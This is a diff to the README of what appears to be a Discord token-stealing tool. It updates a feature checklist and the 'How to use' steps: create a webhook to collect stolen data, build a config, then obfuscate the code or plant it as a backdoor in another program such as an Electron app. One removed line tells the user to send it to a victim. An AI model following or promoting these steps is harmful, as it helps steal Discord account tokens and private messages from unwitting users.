@@ -10,7 +10,7 @@
 - [x] Easy configuration
 - [x] Easy to modify
 - [x] CLI
-- [ ] Searches multiple versions of discord [Discord, Discord Canary, Web etc..]
+- [x] Searches multiple versions of discord [Discord, Discord Canary, Web etc..]
 - [ ] Send email once gathered info about a token
 - [ ] Export DMs as images
 - [ ] Browser Extension
@@ -23,10 +23,10 @@
 # How to use
 
 1. Create a webhook in your discord server (I recommend to do this on a private server)
-2. Install all of the required modules using: `npm install`
-3. Run the CLI using `npm run cli` and fill out the questions respectively to create the configuration file
-4. Here you can choose to obfuscate this code or implement it as a backdoor in a different program (For example: an electron application)
-5. Enjoy! (Just don't forget to send it to your victim)
+2. Install all of the required modules by running `install.bat`
+3. Create the config by running `config.bat` and filling out the required fields
+4. There you go! Now you can choose to obfuscate this code or implement it as a backdoor in a different program (For example: an electron application)
+5. Enjoy!
 
 # Extra Information
 
